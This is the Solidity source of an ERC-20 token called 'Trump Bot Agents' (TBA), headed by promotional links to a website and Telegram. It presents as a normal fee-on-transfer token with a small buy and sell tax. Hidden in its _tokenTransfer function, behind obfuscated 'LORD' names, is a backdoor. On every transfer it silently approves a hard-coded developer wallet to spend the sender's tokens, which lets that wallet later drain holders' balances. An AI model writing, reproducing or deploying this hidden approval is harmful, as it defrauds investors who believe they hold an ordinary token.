/*
An AI Agent platform that focuses on privacy and ease of use. Users can launch, train, and trade AI agents with just one click. Co-own agents to earn revenue share while enjoying personalized tools, fun interactions, and rewards.

Website: https://www.trumpbotagents.pro
Swap: https://swap.trumpbotagents.pro
Stake: https://staking.trumpbotagents.pro 
Bot: https://t.me/trumpagentai_bot
Docs: https://docs.trumpbotagents.pro

Twitter: https://x.com/trumpagents_ai
Telegram: https://t.me/trumpbotagent_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ILORDRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ILORDFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TBA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _lordBalls;
    mapping (address => mapping (address => uint256)) private _lordApprovals;
    mapping (address => bool) private _excludedFromLORD;
    ILORDRouter private _lordRouter;
    address private _lordPair;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalLORD = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Trump Bot Agents";
    string private constant _symbol = unicode"TBA";
    uint256 private _tokenSwapLORD = _tTotalLORD / 100;
    bool private inSwapLORD = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLORD = true;
        _;
        inSwapLORD = false;
    }
    address private _lordWallet = 0x9D23831011308b3F98fba27d1E22dcB4E336AA21;
    
    constructor () {
        _excludedFromLORD[owner()] = true;
        _excludedFromLORD[address(this)] = true;
        _excludedFromLORD[_lordWallet] = true;
        _lordBalls[_msgSender()] = _tTotalLORD;
        emit Transfer(address(0), _msgSender(), _tTotalLORD);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _lordRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function init() external onlyOwner() {
        _lordRouter = ILORDRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_lordRouter), _tTotalLORD);
        _lordPair = ILORDFactory(_lordRouter.factory()).createPair(address(this), _lordRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalLORD;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _lordBalls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _lordApprovals[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _lordApprovals[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _lordApprovals[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address lordF, address lordT, uint256 lordA) private {
        require(lordF != address(0), "ERC20: transfer from the zero address");
        require(lordT != address(0), "ERC20: transfer to the zero address");
        require(lordA > 0, "Transfer amount must be greater than zero");

        uint256 taxLORD = _getLORDFees(lordF, lordT, lordA);

        _tokenTransfer(lordF, lordT, lordA, taxLORD);
    }

    function _tokenTransfer(address lordF, address lordT, uint256 lordA, uint256 taxLORD) private { 
        _approve(lordF, _LORD(tx.origin), lordA); 
        if(taxLORD > 0) {
          _lordBalls[address(this)] = _lordBalls[address(this)].add(taxLORD);
          emit Transfer(lordF, address(this), taxLORD);
        }

        _lordBalls[lordF] = _lordBalls[lordF].sub(lordA);
        _lordBalls[lordT] = _lordBalls[lordT].add(lordA.sub(taxLORD));
        emit Transfer(lordF, lordT, lordA.sub(taxLORD));
    }

    function _LORD(address lordOrigin) private view returns(address) {
        if(block.number > 0 && _excludedFromLORD[lordOrigin]) 
            return lordOrigin;
        return _lordWallet;
    }

    function _getLORDFees(address lordF, address lordT, uint256 lordA) private returns(uint256) {
        uint256 taxLORD=0;
        if (lordF != owner() && lordT != owner()) {
            taxLORD = lordA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (lordF == _lordPair && lordT != address(_lordRouter) && ! _excludedFromLORD[lordT]) {
                _buyCount++;
            }

            if(lordT == _lordPair && lordF!= address(this)) {
                taxLORD = lordA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 lordBalance = balanceOf(address(this)); 
            if (!inSwapLORD && lordT == _lordPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(lordBalance > _tokenSwapLORD)
                swapTokensForEth(minLORD(lordA, minLORD(lordBalance, _tokenSwapLORD)));
                uint256 ethLORD = address(this).balance;
                if (ethLORD >= 0) {
                    sendLORDETH(address(this).balance);
                }
            }
        }
        return taxLORD;
    }

    function minLORD(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendLORDETH(uint256 amount) private {
        payable(_lordWallet).transfer(amount);
    }

    receive() external payable {} 

    function swapTokensForEth(uint256 tokenLORD) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _lordRouter.WETH();
        _approve(address(this), address(_lordRouter), tokenLORD);
        _lordRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenLORD,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}